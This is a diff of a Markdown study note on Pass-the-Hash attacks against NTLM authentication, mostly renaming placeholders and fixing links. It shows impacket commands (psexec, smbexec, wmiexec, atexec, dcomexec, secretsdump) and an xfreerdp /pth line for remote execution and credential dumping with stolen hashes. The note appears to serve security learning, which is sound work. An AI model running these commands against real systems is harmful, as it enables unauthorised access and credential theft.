@@ -11,7 +11,7 @@ The design flaw here is that the hash is used *directly*, never salted or run th
 
 This means that if you can extract the hash, *you can authenticate as if you had the real password* — *without even cracking the it*.
 
->[!note] The NTLM Server only verifies that the Client produces a valid response, which requires a hash, and never validates the actual plaintext password. For a full breakdown of the NTLM challenge-response flow, see [[NTLM_#NTLM authentication]].
+>[!note] The NTLM Server only verifies that the Client produces a valid response, which requires a hash, and never validates the actual cleartext password. For a full breakdown of the NTLM challenge-response flow, see [[NTLM_#NTLM authentication]].
 
 >**Pass-the-Hash (PtH)** is a credential reuse attack in which an adversary captures a user's password hash (typically NT hash) from a compromised system and directly uses that hash to authenticate to other systems without knowing the corresponding plaintext password.
 
@@ -41,8 +41,8 @@ NTLM is used for authentication in many protocols, including:
 - **RDP** (TCP `3389`): remote desktop access (with Restricted Admin Mode enabled; see below).
 - **MSSQL**: when configured with Windows authentication.
 
->[!important] Pass-the-Hash *is not the same* as [[NTLM_relay]].
->Relay attacks forward captured NTLM authentication to another server *in real-time*. This attack doesn't require extracting stored hashes, unlike PtH. See [[NTLM_relay]] for more.
+>[!important] Pass-the-Hash *is not the same* as [[NTLM relay]].
+>Relay attacks forward captured NTLM authentication to another server *in real-time*. This attack doesn't require extracting stored hashes, unlike PtH. See [[NTLM relay]] for more.
 
 
 There are many tools you can use to perform Pass-the-Hash attacks, depending on the protocol you target:
@@ -255,7 +255,7 @@ Scripts commonly used for Pass-the-Hash attacks include:
 -hashes :NTHASH
 ```
 
->[!note] Impacket can also perform NTLM relay attacks. See [[NTLM_relay]].
+>[!note] Impacket can also perform NTLM relay attacks. See [[NTLM relay]].
 
 ### `psexec.py`
 
@@ -265,7 +265,7 @@ Scripts commonly used for Pass-the-Hash attacks include:
 >[!note] [`PsExec`](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is a command-line utility from the Sysinternals suite, designed to execute processes on remote systems. You can run commands, scripts, or applications interactively.
 
 ```bash
-impacket-psexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address> cmd.exe
+impacket-psexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target> cmd.exe
 ```
 
 >[!example]+
@@ -337,7 +337,7 @@ Conditions:
 - You get an execution loop: you type commands, `smbexec.py` creates `.bat` for each, executes, and gives you output. It feels like shell, but it's technically a sequence of command executions.
 
 ```bash
-impacket-smbexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address> cmd.exe
+impacket-smbexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target> cmd.exe
 ```
 
 >[!info] `smbexec.py` is more stealthy than `psexec.py`, since it doesn't upload any service executables to target.
@@ -369,7 +369,7 @@ Conditions (same as `psexec.py`):
 >[!info] `wmiexec.py` is often more stealthy since it doesn't create services.
 
 ```bash
-impacket-wmiexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address> "<command>"
+impacket-wmiexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target> "<command>"
 ```
 
 >[!example]+
@@ -400,7 +400,7 @@ Conditions:
 - `atexec.py` works well even if WMI is restricted but Task Scheduler RPC is available.
 
 ```bash
-impacket-atexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address> "<command>"
+impacket-atexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target> "<command>"
 ```
 
 >[!note] his will work only on Windows >= Vista.
@@ -417,7 +417,7 @@ impacket-atexec -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_addr
 - Often useful when WMI is blocked of filtered, but DCOM endpoints are allowed.
 
 ```bash
-dcomexec.py -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address>
+dcomexec.py -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target>
 ```
 
 >[!example]+
@@ -430,7 +430,7 @@ dcomexec.py -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address>
 - The script doesn't directly give you a remote shell, but may come useful for PtH attacks.
 
 ```bash
-impacket-secretsdump -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target_ip_address> cmd.exe
+impacket-secretsdump -hashes <LM_hash>:<NT_hash_> <domain>/<username>@<target> cmd.exe
 ```
 
 >[!info]+ The user must have enough privileges to fetch the credentials:
@@ -522,7 +522,7 @@ PtH attacks can also be performed via RDP to gain GUI access to the target syste
 You can use `xfreerdp` for this. Connect as normal but instead of a password (`/p:` option), specify an NT hash (`/pth:` option):
 
 ```bash
-xfreerdp /v:<target_ip_address> /u:<username> /pth:<NT_hash> /dynamic-resolution
+xfreerdp /v:<target> /u:<username> /pth:<NT_hash> /dynamic-resolution
 ```
 
 >[!example]+
